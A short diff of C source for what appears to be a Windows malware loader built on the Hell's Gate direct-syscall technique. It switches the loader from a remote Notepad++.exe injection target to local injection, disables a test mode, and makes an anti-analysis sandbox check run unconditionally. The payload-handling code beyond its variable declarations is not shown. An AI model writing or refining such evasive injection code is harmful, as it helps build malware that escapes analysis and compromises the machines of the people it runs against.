@@ -1,9 +1,9 @@
 #include "HellsGate.h"
 #include "Common.h"
 
-#define TEST
+//#define TEST
 
-//#define LOCAL_INJECTION
+#define LOCAL_INJECTION
 
 #ifndef LOCAL_INJECTION
 #define TARGET_PROCESS L"Notepad++.exe"
@@ -12,12 +12,15 @@
 int main() {
 	// Init syscalls for use
 	InitializeSyscalls();
-#ifdef TEST
+
+	// Anti-analysis techniques
 	DWORD	seconds = 5;
 	DWORD	dwMilliseconds = seconds * 1000;
 	if (AntiAnalysis(dwMilliseconds) == FALSE) {
 		printf("File Is Being Analyzed!\n");
 	}
+#ifdef TEST
+	
 #else
 	PVOID pPayloadAddress = NULL;
 	SIZE_T sPayloadSize = 0;
